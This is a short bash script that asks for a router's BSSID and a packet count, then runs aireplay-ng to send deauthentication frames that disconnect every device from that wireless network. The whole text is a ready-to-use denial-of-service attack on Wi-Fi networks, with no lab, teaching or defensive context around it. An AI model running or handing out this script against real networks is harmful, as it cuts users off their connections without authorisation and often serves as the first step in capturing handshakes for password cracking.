read -p "Enter the router bssid to deauth all devices from network: " bssid
read -p "Enter number od packets to be sent: " packets
sudo aireplay-ng --deauth $packets -a $bssid wlan0
